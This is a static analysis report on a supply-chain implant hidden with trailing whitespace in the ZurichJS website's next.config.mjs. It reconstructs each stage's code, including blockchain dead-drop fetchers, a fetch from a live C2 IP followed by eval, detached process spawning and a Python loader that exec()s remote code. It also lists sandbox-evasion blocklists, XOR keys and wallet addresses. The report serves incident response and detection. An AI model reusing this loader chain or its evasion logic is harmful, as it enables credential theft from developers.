# ZurichJS Supply-Chain Attack -- Static Analysis Report

**Infection commit:** `556dba47cede89f7b1c753b2df2d76cd2a7ab0e8` -- 2026-02-19  
**Remediation commit:** `87196d26de2360cb2fbd49cb3a480aa6043f56d7` -- 2026-05-04 ("remove junk")  
**Campaign live:** 74 days (2026-02-19 -> 2026-05-04)  
**Implant file:** `next.config.mjs` -- payload hidden after 2,784 ASCII spaces on final line  
**Analysis date:** 2026-05-06  
**Method:** 100% static -- no eval, no network during decoding

---

## Executive Summary

A malicious payload of 4,630 bytes was injected into the ZurichJS website repository (`zurich-js/zurichjs-website`) on **2026-02-19**, hidden after **2,784 ASCII space characters** at the end of line 54 in `next.config.mjs` -- invisible in virtually all editors and diff views. The payload went undetected for **74 days** before being removed on 2026-05-04. The implant is a **full credential-harvesting RAT** implementing a five-stage blockchain dead-drop + live C2 system. All five stages have been fully decoded and analyzed, including live fetches of the Stage 3 payload (65,438 bytes) and Stage 5 Python harvester (81,539 bytes).

**Confirmed capabilities** (from Stage 3 decoded payload):
1. **Sandbox/CI evasion**: fingerprints 52 known CI runners, sandboxes, and analysis usernames before activating
2. **Victim registration**: beacons to C2 with unique MD5-derived victim ID, environment fingerprint, and campaign codes `EV-4A6OE6M0E` / `EV-CHQG3L42M`
3. **Python staging**: downloads and installs Python if absent, then fetches and executes a Python Stage 4 payload
4. **Blockchain persistence**: uses TRON/Aptos/BSC dead-drops to deliver Stage 4 -- infrastructure is immutable and cannot be taken down
5. **Cross-platform**: targets Linux, macOS, and Windows (WSL2 aware)

The implant chain:
1. Uses three blockchain networks (TRON, Aptos, BNB Smart Chain) as resilient infrastructure for payload storage
2. Applies seven independent layers of shuffle-cipher obfuscation plus XOR encryption across stages
3. Spawns a detached, invisible Node.js child process for persistence
4. Has a confirmed live C2 server at `198.105.127.210:27017` (HTTP, 65KB Stage 3 payload retrieved)
5. Delivers Stage 4 as Python code via blockchain dead-drop, executed via `python3 -c <payload>`

---

## Attack Chain Overview

```
next.config.mjs (whitespace-hidden)
    +- Stage 0: shuffle cipher _$_46e0 -> TpC token decoder -> _$af864575
           Anti-replay guard; blockchain dead-drop lookup
           TRON wallet 1,2 -> BSC tx hash -> XOR-decrypt (key1/key2)
           Dual execution: eval() + detached child_process.spawn()
           |
           +- Stage 1a (XOR key1): decrypted_0x9b94b4ffaaaae8_key1.txt
           |       Timestamp guard; stores __dirname/__filename
           |       Sets global._t_1 (TRON wallet 1), global._t_2 (Aptos addr 1)
           |       Inner fXA/ukD/Gpr layer ->
           |           Stage 2a: fetches TRON+Aptos APIs -> new BSC hash -> eval(n)
           |                          v
           |                     Stage 3 (blockchain path)
           |                          v
           |                     Stage 4 Python (blockchain path)
           |
           +- Stage 1b (XOR key2): decrypted_0xbcc976e1c8f3df_key2.txt
                   Injects require/module globals
                   Sets global._t_s = C2 server URLs
                   Sets global._t_1 (TRON wallet 3), global._t_2 (BSC tx 2)
                   Sets global._H = http://198.105.127.210:27017
                   Inner DJF/EBG/YpX layer ->
                       Stage 2b: HTTP GET /$/boot -> XOR-decrypt -> await eval()
                                      v
                                 Stage 3 (C2 direct path) -- SAME payload as above
                                      v
                                 Stage 4 Python (blockchain path)
```

---

## Stage 0 -- Implant in next.config.mjs

### Infection Details

| Field | Value |
|-------|-------|
| **Repository** | `zurich-js/zurichjs-website` (GitHub) |
| **File** | `next.config.mjs` |
| **Infection commit** | `556dba47cede89f7b1c753b2df2d76cd2a7ab0e8` |
| **Infection date** | 2026-02-19T10:11:43Z |
| **Commit message** | `fix(tshirt): resolve hydration mismatch error and refactor into components` |
| **Author** | Faris Aziz (`farisaziz12`, GitHub ID 53216647) |
| **Cover** | 12 files changed -- 11 legitimate tshirt component files buried the 1 malicious change |
| **Stealth technique** | **2,784 ASCII space characters** appended to the last line (`export default nextConfig;`) -- invisible in all standard editor/diff views |
| **Payload size** | 4,630 bytes of obfuscated JavaScript |
| **Infected file size** | 8,546 bytes (SHA-256: `4583081d304bae4ecae255d62fead827c8fc1f73d462fb364717fca829d36ff2`) |
| **Remediation** | `87196d26de2360cb2fbd49cb3a480aa6043f56d7` ("remove junk") -- 2026-05-04 |
| **Duration live** | **74 days** |
| **TRON wallet first tx** | 2026-03-26 (first confirmed victim fetch -- ~35 days after implant) |

**Infection technique -- the diff was deceptive:**  
The commit added two apparently legitimate lines for ESM compatibility:
```javascript
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
```
These are actually **required by the attack** -- they create a `require()` function in the ESM module scope. The payload then assigns it to `global.require` so subsequent obfuscated stages can load Node.js built-ins. The third "change" was the infected `export default nextConfig;` line with 2,784 trailing spaces and the full payload -- indistinguishable from a normal export in GitHub's diff view unless whitespace is explicitly shown.

### Obfuscation Pipeline

**Layer 1:** `_$_46e0` shuffle cipher  
- Seed: `192110`, add1/add2: `(157,320)`, mod1/mod2: `(40163,28225)`, seed_mod: `2788491`  
- Produces a 57-element token dictionary (`_$_501c[]`)

**Layer 2:** TpC word-token compression  
- Input split by space into word array; back-references replace repeated tokens  
- Tokens: 2-char (special byte + operand) or 3-char (backtick prefix)  
- Constants: s=33, a=93, e=96(backtick); token table: `[79,65,72,81,86,66,75,80,82,71,76,74,94,88,70,90,60,85,87,89]`  
- Char substitutions applied after: `.a`->`*`, `.b`->space, `.c`->`\`, `.d`->`` ` ``, `.e`->`\n`, `.f`->`'`, `.!`->`.`

**Layer 3:** `_$af864575` shuffle cipher  
- Seed: `192110` (reused), same structure, different constants  
- Produces the innermost encoded string arrays

### Decoded `_$_501c` Array (57 entries -- selected key entries)

| Index | Value |
|-------|-------|
| [0] | `require` |
| [1] | `Buffer` |
| [2] | `Date` |
| [3] | `process` |
| [4-8] | node module names (crypto, fs, child_process...) |
| [15] | `eval` |
| [17] | `child_process` |
| [19] | `spawn` |
| [21] | `bsc-dataseed.binance.org` |
| [22] | `bsc-rpc.publicnode.com` |
| [33] | `eth_getTransactionByHash` |
| [34] | `?.?` (calldata delimiter) |
| [40] | `TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF` (TRON wallet 1) |
| [41] | `TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH` (TRON wallet 2) |
| [42] | `0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519` (Aptos addr 1) |
| [43] | `0x3d2075f97b7b1e3234bd653779d21c605d7d8c6ec9c98d983880be5c7f4f9471` (Aptos addr 2) |
| [44] | XOR key 1: `2[gWfGj;<:-93Z^C` |
| [45] | XOR key 2: `m6:tTh^D)cBz?NM]` |

### Execution Trigger

The payload fires automatically whenever the Next.js application starts -- it does **not**
fire on `git clone` or `npm install`:

```bash
npm run dev      # next dev   -- development server startup
npm run build    # next build -- production build
npm run start    # next start -- production server startup
```

Next.js evaluates `next.config.mjs` as the very first thing it does before compiling pages
or serving requests. Any contributor who pulled the repo between **2026-02-19** and
**2026-05-04** and started the app was exposed. The app continues to load normally after
the payload runs -- no error, no crash, no visible indication.

### Stage 0 Behavior

```javascript
// Anti-replay: skip if cooldown active
if (global._p_t && Date.now() - global._p_t < 30000) return;
global._p_t = Date.now();
global.i = '5-3-161';   // campaign marker

// Bootstrap Node.js APIs from globals (avoids direct require() call)
var require = global.r;
var Buffer  = global.Buffer;
// ...

// Blockchain dead-drop lookup
// 1. GET https://api.trongrid.io/v1/accounts/<wallet>/transactions?only_confirmed=true&only_from=true&limit=1
// 2. raw_data.data field: hex-decode then reverse -> BSC tx hash (0x...)
// 3. GET https://fullnode.mainnet.aptoslabs.com/v1/accounts/<addr>/transactions?limit=1
// 4. payload.arguments[0] -> BSC tx hash fallback
// 5. POST bsc-dataseed.binance.org  eth_getTransactionByHash(txhash)
// 6. Strip calldata after '?.?' marker
// 7. XOR-decrypt(calldata, key1) -> Payload 1 script
//    XOR-decrypt(calldata, key2) -> Payload 2 script

// Dual execution of next stage
eval(payload1);
require('child_process').spawn('node', ['-e', payload2], {
    detached: true, stdio: 'ignore', windowsHide: true
}).unref();
```

---

## Stage 1a -- Next-Stage Payload 1 (XOR key1)

**File:** `c2_data/decrypted_0x9b94b4ffaaaae8_key1.txt` (6189 bytes)  
**Cipher:** fXA -- seed `3178291`, add1=224, mod1=44330, add2=308, mod2=16994, seed_mod=6601830

### Behavior

```javascript
(async () => {
    // Single-execution guard
    if (global["_t_t"]) return;
    global["_t_t"] = (new global.Date).getTime();

    // Capture source location for reporting
    if (typeof __dirname   !== "undefined") global["___dirname"]   = __dirname;
    if (typeof __filename  !== "undefined") global["___filename"]  = __filename;

    // Store this stage's source for C2 exfil
    global["_t_c"] = c.toString();

    // Bootstrap TRON wallet 1 and Aptos addr 1 via atob(base64)
    // _$_f5c4 decoded: ['_t_1','TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF','_t_2','0x9d20...']
    global["_t_0"] = atob("dmFyIF8k...");   // base64 -> inline _$_f5c4 decoder
    global["_t_1"] = "TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF";
    global["_t_2"] = "0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519";

    await c();   // execute inner stage 2 fetcher
})();
```

### Inner Stage 2a -- Blockchain Dead-Drop Fetcher (payload1_inner_final2.js)

**String array:** `_$_7e9d` -- 43-entry decode via `_$af1098152` (seed=447065, add1=100, mod1=53229, add2=504, mod2=49365, seed_mod=2492436)

**Fully decoded `_$_7e9d` array (selected entries):**

| Index | Value |
|-------|-------|
| [0] | `'r'` -> `require` module reference |
| [1] | `'end'` |
| [3] | `'on'` |
| [5] | `'data'` |
| [6] | `'parse'` |
| [7] | `'JSON'` |
| [8] | `'get'` |
| [9] | `'https'` |
| [11] | `'2.0'` |
| [12] | `'stringify'` |
| [13] | `'POST'` |
| [19] | `'utf8'` |
| [22] | `'/transactions?only_confirmed=true&only_from=true&limit=1'` |
| [23] | `'hex'` |
| [25] | `'Buffer'` |
| [28] | `'/transactions?limit=1'` |
| [29] | `'?.?'` -- calldata payload delimiter |
| [33] | `'eth_getTransactionByHash'` |
| [34] | `'bsc-dataseed.binance.org'` |
| [35] | `'bsc-rpc.publicnode.com'` |
| [40] | `'2[gWfGj;<:-93Z^C'` -- **Stage 3 XOR key** |
| [41] | `'_t_1'` -- TRON wallet global var name |
| [42] | `'_t_2'` -- Aptos address global var name |

**Fully decoded behavior:**

```javascript
// Stage 2a -- blockchain dead-drop fetcher
const c = global;
const u = c['r'];   // require (set by stage 1a outer)

// Async HTTP GET helper
async function a(url) {
    return new Promise((res,rej) => {
        u('https').get(url, (resp) => {
            let body = '';
            resp.on('data', d => body += d);
            resp.on('end', () => res(JSON.parse(body)));
        }).on('error', rej).end();
    });
}

// BSC JSON-RPC POST helper
async function s(method, params, host) {
    return new Promise((res,rej) => {
        const body = JSON.stringify({jsonrpc:'2.0', method, params, id:1});
        const req = u('https').request({hostname:host, method:'POST'}, (resp) => {
            let data = '';
            resp.on('data', d => data += d);
            resp.on('end', () => res(JSON.parse(data)));
        }).on('error', rej);
        req.write(body); req.end();
    });
}

// Main: fetch -> decrypt -> stage 3
async function fetchStage3(xorKey, tronWallet, aptosAddr) {
    let bscTxHash;
    try {
        // Step 1: TRON -> get latest tx -> extract reversed BSC hash
        const tronTx = await a(
            "https://api.trongrid.io/v1/accounts/" + tronWallet +
            "/transactions?only_confirmed=true&only_from=true&limit=1"
        );
        bscTxHash = Buffer.from(tronTx.data[0].raw_data.data, 'hex')
                          .toString('utf8')
                          .split('').reverse().join('');
        // Note: the BSC tx hash is stored REVERSED in the TRON memo field
    } catch {
        // Step 1 fallback: Aptos -> get latest tx -> extract BSC hash
        const aptosTx = await a(
            "https://fullnode.mainnet.aptoslabs.com/v1/accounts/" + aptosAddr +
            "/transactions?limit=1"
        );
        bscTxHash = aptosTx[0].payload.arguments[0];
    }

    let encrypted;
    try {
        // Step 2: BSC -> get tx calldata (primary RPC)
        const bscTx = await s('eth_getTransactionByHash', [bscTxHash],
                               'bsc-dataseed.binance.org');
        const raw = Buffer.from(bscTx.result.input.substring(2), 'hex').toString('utf8');
        encrypted = raw.split('?.?')[1];   // take everything after '?.?' delimiter
    } catch {
        // Step 2 fallback: alternate BSC RPC
        const bscTx = await s('eth_getTransactionByHash', [bscTxHash],
                               'bsc-rpc.publicnode.com');
        const raw = Buffer.from(bscTx.result.input.substring(2), 'hex').toString('utf8');
        encrypted = raw.split('?.?')[1];
    }

    // Step 3: XOR decrypt with cycling key
    return [...encrypted].map((ch, i) =>
        String.fromCharCode(ch.charCodeAt(0) ^ xorKey.charCodeAt(i % xorKey.length))
    ).join('');
}

const stage3 = await fetchStage3(
    '2[gWfGj;<:-93Z^C',         // XOR key (embedded in _$_7e9d[40])
    c['_t_1'],                   // TRON wallet (set by stage 1a outer)
    c['_t_2']                    // Aptos address (set by stage 1a outer)
);
eval(stage3);   // Execute Stage 3
```

---

## Stage 1b -- Next-Stage Payload 2 (XOR key2)

**File:** `c2_data/decrypted_0xbcc976e1c8f3df_key2.txt` (4467 bytes)  
**Cipher:** DJF -- seed `934068`, add1=103, mod1=25714, add2=521, mod2=40896, seed_mod=2241354  
**Outer decode:** `_$_2263` array (seed 100664): `['function','r','object','m']` -- injects `require` and `module`

### Behavior

```javascript
// Inject require and module into global scope
if (typeof require === 'function') global['r'] = require;
if (typeof module  === 'object' ) global['m'] = module;

// _$_f1f4 decoded via _$af183572 (seed 80452):
// ['_t_s','http://198.105.127.210:443',
//  '_t_u','http://198.105.127.210:80',
//  '_t_1','TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v',
//  '_t_2','0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1']

global['_t_s'] = 'http://198.105.127.210:443';   // C2 URL (outer stage declares)
global['_t_u'] = 'http://198.105.127.210:80';    // C2 fallback
global['_t_1'] = 'TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v';   // TRON wallet 3 (outer)
global['_t_2'] = '0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1'; // (outer)
```

### Inner Stage 2b -- Direct C2 Fetcher (payload2_inner_final2.js)

**String array:** `_$_9b39` -- 57-entry decode via `_$af775639` (seed=3935882, add1=471, mod1=35190, add2=371, mod2=32023, seed_mod=6174516)  
**Secondary obfuscator:** Sojuwan `a0a`/`a0b` pattern with anti-tamper integrity check (`_$af775631`, target=`0xedda2`=974754, rotation=3)

**Fully decoded `_$_9b39` array (selected entries):**

| Index | Value |
|-------|-------|
| [0] | `'http://'` |
| [11] | `'/$/boot'` -- **Stage 3 C2 path** |
| [12] | `'198.105.127.210'` -- **C2 IP** |
| [14] | `'User-Agent'` |
| [29] | `'ThZG+0jfXE6VAGOJ'` -- **Stage 3 XOR key (C2 path)** |
| [35] | `'GET'` |
| [36] | `'hostname'` |
| [45] | `'_H'` -- global name for C2 base URL |
| [46] | `':'` |
| [47] | `'0x9d202c824402ca89e9'` -> start of Aptos address string |
| [48] | `'Mozilla/5.0 (Windows'` |
| [49] | `' NT 10.0; Win64; x64'` |
| [52] | `''` (empty -- XOR accumulator init) |
| [53] | `'on'` |

**Sojuwan `n(0xXX)` mappings (rotation=3, key entries):**

| Call | Resolves to |
|------|-------------|
| `n(0xb3)` | `'/$/boot'` |
| `n(0xb4)` | `'198.105.127.210'` |
| `n(0xb5)` | `'_t_2'` |
| `n(0xb6)` | `'User-Agent'` |
| `n(0xcb)` | `'GET'` |
| `n(0xcc)` | `'hostname'` |
| `n(0xc5)` | `'ThZG+0jfXE6VAGOJ'` (XOR key) |
| `n(0xcf)` | `'_t_1'` |
| `n(0xd1)` | `'TCqf6ZkaQD84vYsC2cuu'` -> part of TRON wallet |
| `n(0xd3)` | `'http://'` |

**Fully decoded behavior:**

```javascript
// Stage 2b -- direct C2 fetch + config setter
const u = require;   // global['r']

// Set C2 base URLs
global['_H']  = 'http://' + '198.105.127.210' + ':' + 0x6989;  // port 27017
global['_H2'] = 'http://198.105.127.210:27017';  // same

// Override blockchain addresses (for stage 3 use)
global['_t_1'] = 'TCqf6ZkaQD84vYsC2cuu' + '1jRwB6JveTaRrF';
// -> 'TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF'  (same TRON wallet as stage 1a)

global['_t_2'] = '0x9d202c824402ca89e9' + 'aaccd2390b6f8b332ae7'
               + '43caa1469c695feb2781' + 'd56519';
// -> '0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519' (Aptos addr 1)

// Build URL object for C2 endpoint
const targetUrl = new URL('http://198.105.127.210:27017' + '/$/boot');
//  hostname: 198.105.127.210
//  port:     27017  (0x6989)
//  path:     /$/boot

// HTTP GET to C2 with fake browser User-Agent
const requestOpts = {
    method: 'GET',
    hostname: targetUrl.hostname,   // '198.105.127.210'
    port:     targetUrl.port,       // '27017'
    path:     targetUrl.pathname,   // '/$/boot'
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    + 'AppleWebKit/537.36 (KHTML; like Gecko) '
                    + 'Chrome/131.0.0.0 Safari/537.36',
        'Sec-V': global['_V'] || 0  // victim version fingerprint
    }
};

const encrypted = await new Promise((resolve, reject) => {
    const req = u('http').request(requestOpts, (resp) => {
        let body = '';
        resp.on('data', chunk => body += chunk);
        resp.on('end', () => resolve(body));
    });
    req.on('error', reject);
    req.end();
});

// XOR decrypt response with 16-char cycling key
const xorKey = 'ThZG+0jfXE6VAGOJ';   // _$_9b39[29]
const stage3 = [...encrypted].map((ch, i) =>
    String.fromCharCode(ch.charCodeAt(0) ^ xorKey.charCodeAt(i % xorKey.length))
).join('');

await eval(stage3);   // Execute Stage 3
```

---

## Stage 3 -- Live C2 Payload (65,438 bytes, decoded)

**Source:** `GET http://198.105.127.210:27017/$/boot`  
**Fetched:** 2026-05-06 | Raw: `c2_data/stage3_raw.bin` | Decrypted: `c2_data/stage3_decrypted.js`  
**Encryption:** XOR with key `ThZG+0jfXE6VAGOJ` over HTTP chunked-encoded response body  
**Inner obfuscation:** Sojuwan RC4 string array (`a0c`/`a0d` pattern), 1022 entries, per-call-site 4-char RC4 keys  
**Human-readable version:** `c2_data/stage3_human.js` -- 876 call sites annotated

### 3.1 -- Sandbox / CI-CD Environment Detection (52 fingerprints)

Stage 3 checks the runtime environment against an extensive blocklist before activating. If a match is found, it reports `"(Blocked)"` to the C2 and exits -- **Stage 4 and Stage 5 are never fetched**. The Next.js application continues loading normally; the developer sees no error, crash, or slowdown. This is how the malware avoids detection in CI pipelines, sandboxes, and analyst VMs while still firing on real developer workstations.

**Blocked usernames:**
```
ssm-user  azureuser  ec2-user  runner  www-data  root  ubuntu  kali
sail  bitnami  panda  forge  frappe  webapp  buildbot  circleci
```

**Blocked platform/service identifiers:**
```
expo  amplify  cnb  assemblyline  render  devcontainer  codespace
cloudchamber  sandbox-pool  heroku  vercel-sandbox  buildkitsandbox
vizion_running  turtle-worker  staging-backend  staging-frontend
on-workers-pool  shop_runner  github-runner  microsoft-standard-WSL2
agent-env-  1a-cicd-  1b-cicd-  -cloud  -aws  -azure  linuxkit
-vm.podset-v  vmi  ms.dt-skywag  rod-vm.svc.
```

**Blocked IP prefixes / hostname patterns:**
```
192.168.  100.64.  ip-172-  localhost  .compute.internal  .cm2  -aarch64-
```

**CI/CD environment variable fingerprints:**
- `__NEXT_PRIVATE_*`, `NEXT_PRIVATE_*`, `NEXT_DEPLOYMENT_*` (Next.js deployment context)
- `K_SERVICE` (Google Cloud Run), `VERCEL_HIVE_VERSION` (Vercel)

### 3.2 -- Victim Registration Beacon

Generates a unique victim ID (MD5-derived hash from `9a47bb48b7b8` + `ca41fc138fd3` + `372e8cc0`) and POSTs to `http://198.105.127.210:27017`.

**Beacon fields:**
```
unique_id          -- victim MD5 fingerprint
_TRACE_ID          -- trace token
CLIENT_ID (ENT_ID) -- campaign enrollment ID
created_at         -- timestamp
versioning         -- version from global._V (Sec-V header)
pm_uptime          -- uptime (pm2 process manager query)
prev_restart       -- restart counter
restart_time       -- last restart timestamp
exit_code          -- previous exit code
finish             -- completion flag
_delay             -- retry backoff (15-second intervals)
_module            -- module path context
```

**Campaign / batch IDs hardcoded in Stage 3:**
```
EV-4A6OE6M0E
EV-CHQG3L42M
```

### 3.3 -- Python Installation (cross-platform)

If `python3` or `python.exe` is not found, Stage 3 bootstraps a Python installation:

**Linux/macOS:**
```
GET https://bootstrap.pypa.io/get-pip.py -> /tmp/get-pip.py
tar -xf python.zip  (fallback path)
```

**Windows -- two-step fallback cascade:**
```
1. Try: tar -xf python.zip  (tar is built in on Windows 10+)
2. If tar fails:
     GET http://198.105.127.210:27017/d/7zr.exe  -> saved locally
     GET http://198.105.127.210:27017/d/python.7z -> saved locally
     run: 7zr.exe x python.7z -o<target_dir> -y
```

`7zr.exe` and `python.7z` are hosted on the C2 server itself -- no external dependency. This ensures Python installs even on stripped-down Windows environments where `tar` is missing (pre-2019 builds). Without this fallback, the entire harvest chain would fail on those machines.

**Temp file prefix:** `tmp7A863DD1.*`

### 3.3b -- WSL (Windows Subsystem for Linux) Behaviour

Stage 3 explicitly detects WSL2 via `os.release().includes("microsoft-standard-WSL2")` and handles it as a **special hybrid case**, different from both pure Linux and pure Windows:

**On WSL2** (`os.release()` contains `"microsoft-standard-WSL2"`):
- Stage 3 spawns the payload on the **Linux side** (`node` -- detached)
- AND **also spawns `node.exe`** (Windows-native Node.js via WSL2 interop) with the same payload
- This means the Windows-side credential harvest runs too -- Chrome/Firefox/Edge profiles in `%APPDATA%` and `%LOCALAPPDATA%` are fully accessible from the Windows `node.exe` process
- The sandbox evasion block is **skipped** for WSL2 -- it only runs for pure Linux

**On WSL1 / pure Linux** (no `"microsoft-standard-WSL2"` in release):
- Pure Linux code path -- sandbox evasion checks run normally
- Stage 5 BOT detection applies: if no browser credential files are found on the Linux side AND no crypto extensions AND no Firefox profiles -> reports `"(Blocked)"` as BOT and exits
- This is why **WSL without WSL2 is inconsistent** -- it depends on whether the Linux-side browser profiles exist. Most WSL1 installs have no browser at all -> Stage 5 exits early. A WSL1 install with Firefox or Chromium on Linux would succeed.

**Summary:**

| Environment | Outcome |
|-------------|---------|
| WSL2 (microsoft-standard-WSL2 in release) | Runs on both Linux and Windows sides via `node.exe` interop -- **likely to succeed** |
| WSL1 / generic WSL without that string | Pure Linux path -- **succeeds only if Linux browser profiles exist** |
| Pure Linux developer machine with browsers | Succeeds |
| Pure Linux CI / headless | Blocked by BOT detection (no credentials found) |

### 3.4 -- Stage 4 Python Payload -- Embedded in Stage 3 String Table

**Key finding:** The Python Stage 4 code is **not fetched from blockchain** -- it is **assembled directly within Stage 3** from 136 RC4 string fragments (indices in the `a0c`/`a0d` array). At runtime, Stage 3 concatenates these fragments with the C2 base URL to produce a complete Python script, then spawns it via `child_process.spawn('python3', ['-c', payload])`.

**Reconstructed Python payload** (with runtime variable substitution applied):

```python
# --- OUTER wrapper (spawned by Node.js, id='1', _V=victim_version) ----------
code = """
import sys
from urllib.request import urlopen, Request
if len(sys.argv) < 2: print('invalid args'); sys.exit()
Request._target = 'http://198.105.127.210:27017'  # <- runtime substitution of global._H2
id = sys.argv[1]                                   # = '1'
Request._V = sys.argv[2] if len(sys.argv) > 2 else ''
Request._F = sys.argv[3] if len(sys.argv) > 3 else None
sys.argv = sys.argv[:1]

# Fetch Stage 5 Python payload from C2 via HTTP GET
Request._code = urlopen(Request(
    f'http://198.105.127.210:27017/$/{id}',        # = /$/1
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Sec-V': Request._V   # victim version fingerprint
    }
)).read().decode('utf-8')
exec(Request._code)   # execute fetched Python -- THIS is the credential harvester
"""

# --- INNER detached subprocess -----------------------------------------------
import os, sys, subprocess
_V = sys.argv[1] if len(sys.argv) > 1 else ''
_F = sys.argv[2] if len(sys.argv) > 2 else ''
if sys.platform.startswith("win"):
    flags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
else:
    flags = 0
subprocess.Popen([sys.executable, '-c', code, '1', _V, _F],
                 creationflags=flags,
                 preexec_fn=os.setsid if flags == 0 else None)
# Alternate invocation (commented out in original): id='zz2'
```

**Stage 5 endpoint:** `GET http://198.105.127.210:27017/$/1` -- delivers a Python payload that is `exec()`'d. Content is not recoverable without probing the live C2. This is the true credential harvester / RAT body.

**Saved to:** `c2_data/stage4_python.py`

Stage 3 also has a **blockchain dead-drop component** (TRON->BSC, same mechanism as Stage 2a) that uses XOR key `2[gWfGj;<:-93Z^C`. During analysis this resolved to the same Stage 2a content (anti-rerun guarded). The blockchain slot can be updated independently by the attacker.

### 3.5 -- Retry / Persistence Loop

```javascript
const RETRY_DELAY_MS = 0x3a98;  // 15,000 ms = 15 seconds
const MAX_RETRIES = 3;

// Reports errors to C2 (POST to http://198.105.127.210:27017)
// Retries each operation up to 3 times before aborting
```

### 3.6 -- Platform Detection & Adaptation

```javascript
const platform = os.platform();   // 'linux' | 'darwin' | 'win32'
let hostname = os.hostname();

// macOS detection: hostname prefix "Mac-" or ".lan" suffix
if (platform === 'darwin' && (hostname.startsWith('Mac-') || hostname.endsWith('.lan')))
    hostname = 'Mac';

// WSL2 detection: os.release() contains 'microsoft-standard-WSL2'
// Cloud runner detection: various hostname/username prefix checks (see S.3.1)
```

### 3.7 -- Module Imports Used by Stage 3

```javascript
require('os')            // platform, hostname, userInfo, release, homedir
require('path')          // join (for module path manipulation)
require('fs')            // file system ops (python install, pid files)
require('crypto')        // MD5 fingerprinting (via 'MD5' string)
require('child_process') // spawn (python -c, node -e detached)
require('http')          // C2 registration / data exfil POSTs
require('https')         // blockchain dead-drop GETs
// Also dynamically: 'axios' (if available)
```

---

## Blockchain Dead-Drop Architecture -- Full Stage Map

All stages use **the same TRON wallet infrastructure** for payload storage. The attacker controls the payload at any stage by publishing a new TRON transaction (which updates the BSC tx hash pointer).

```
+-----------------------------------------------------------------------------+
|                    BLOCKCHAIN DEAD-DROP CHAIN                               |
|                                                                             |
|  Stage 0 (implant) reads:                                                   |
|    TRON wallet 1: TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF                       |
|    TRON wallet 2: TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH                       |
|    (Aptos fallbacks for each)                                                |
|         |                                                                   |
|         v                                                                   |
|    BSC TX 0x9b94b4ff...  [calldata split on '?.?']                          |
|         +- XOR key1 '2[gWfGj;<:-93Z^C' -> Stage 1a payload                  |
|         +- XOR key2 'm6:tTh^D)cBz?NM]' -> Stage 1b payload                  |
|                                                                             |
|  Stage 1a sets globals:                                                     |
|    global._t_1 = 'TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF'  <- wallet 1 (reused)|
|    global._t_2 = '0x9d202c824402ca89e9...' (Aptos addr 1)                  |
|         |                                                                   |
|         v  (Stage 2a: same TRON wallet -> same BSC tx lookup)                |
|    BSC TX 0x9b94b4ff...  [currently same tx -- attacker can rotate]          |
|         +- XOR key '2[gWfGj;<:-93Z^C' -> Stage 3 payload (eval'd)           |
|                                                                             |
|  Stage 1b sets globals:                                                     |
|    global._H  = 'http://198.105.127.210:27017'                              |
|    global._t_1 = 'TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF'  <- wallet 1 (reused)|
|    global._t_2 = '0x9d202c824402ca89e9...' (Aptos addr 1)                  |
|         |                                                                   |
|         v  (Stage 2b: HTTP GET /$/boot)                                     |
|    C2 server 198.105.127.210:27017  -> Stage 3 payload (same as above)       |
|                                                                             |
|  Stage 3 contains two Stage-4 delivery paths:                               |
|                                                                             |
|  Path A -- Embedded Python (confirmed):                                      |
|    Stage 3 assembles Python code from 136 RC4 string fragments              |
|    spawn('python3', ['-c', embedded_code, '1', _V, _F])                    |
|    Python fetches: GET http://198.105.127.210:27017/$/1                     |
|    exec()s response -> Stage 5 (live credential harvester)                  |
|                                                                             |
|  Path B -- Blockchain (current slot = Stage 2a, no Python yet):             |
|    global._t_1 = 'TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF'                    |
|    global._t_2 = '0x9d202c824402ca89e9...'                                 |
|    BSC TX 0x9b94b4ff... -> XOR '2[gWfGj;<:-93Z^C' -> node -e payload        |
|    [attacker can rotate by publishing new TRON tx -> new BSC hash]           |
+-----------------------------------------------------------------------------+
```

### Key observations

| Observation | Implication |
|-------------|-------------|
| All stages use **wallet 1** (`TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF`) | Single rotation point controls all blockchain-path stages |
| Stages 2a, 3's blockchain fetch use the **same BSC tx** currently | When attacker pushes Node.js Stage 4, they publish a new TRON tx pointing to a new BSC hash |
| Stage 2b uses HTTP (`/$/boot`) instead of blockchain | C2 server is the rotation point for this path; blockchain only needed for stages 2a/3 |
| **Python Stage 4 is embedded in Stage 3 string table** (136 fragments) | Not blockchain-delivered -- embedded in every instance of Stage 3 |
| Python Stage 4 fetches Stage 5 from `http://198.105.127.210:27017/$/1` | True credential harvester lives on C2, rotatable without blockchain |
| XOR key `2[gWfGj;<:-93Z^C` appears at every blockchain decryption step | Compromising this key decrypts all blockchain-delivered payloads |
| Aptos addresses are always fallbacks -- TRON is primary | Monitoring TRON wallet 1 is sufficient for detecting payload rotations |

---

## C2 Infrastructure

### Command-and-Control Server

| Host | Port | Path | Protocol | Role |
|------|------|------|----------|------|
| `198.105.127.210` | 443 | -- | HTTP (not TLS) | Outer-layer C2 reference (`_t_s`) |
| `198.105.127.210` | 80  | -- | HTTP | Outer-layer C2 fallback (`_t_u`) |
| `198.105.127.210` | **27017** | `/$/boot` | HTTP | **Stage 3 delivery (inner payload 2)** |

